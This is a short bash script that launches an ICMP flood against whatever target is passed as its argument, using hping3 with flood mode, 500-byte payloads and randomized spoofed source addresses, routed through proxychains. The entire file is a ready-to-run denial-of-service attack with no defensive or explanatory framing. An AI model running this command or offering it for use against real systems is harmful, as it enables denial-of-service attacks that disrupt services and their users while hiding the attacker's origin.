#!/bin/bash

sudo proxychains hping3 -d 500 -1 --flood --rand-source "$1"
